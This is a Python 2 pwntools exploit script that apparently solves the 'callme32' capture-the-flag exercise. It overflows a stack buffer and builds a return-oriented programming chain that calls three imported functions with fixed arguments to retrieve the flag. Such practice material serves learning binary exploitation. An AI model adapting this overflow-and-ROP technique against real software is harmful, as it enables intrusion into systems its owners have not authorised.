from pwn import *

callme32 = ELF('callme32')

pop3_ret = p32(0x080488a9)              # pop 3 args 

rop_chain = "Z"*44			# overwrite eip

rop_chain += p32(0x080485c0)            # sym.imp.callme_one
rop_chain += pop3_ret                   # pop arguments into registers
rop_chain += p32(1)                     # arg
rop_chain += p32(2)                     # arg
rop_chain += p32(3)                     # arg

rop_chain += p32(0x08048620)            # sym.imp.callme_two
rop_chain += pop3_ret                   # pop arguments into registers
rop_chain += p32(1)                     # arg
rop_chain += p32(2)                     # arg
rop_chain += p32(3)                     # arg

rop_chain += p32(0x080485b0)            # sym.imp.callme_three
rop_chain += pop3_ret                   # pop arguments into registers
rop_chain += p32(1)                     # arg
rop_chain += p32(2)                     # arg
rop_chain += p32(3)                     # arg

p = process(callme32.path)
p.recvuntil('> ')
p.sendline(rop_chain)
flag = p.recv()
print ""
print flag
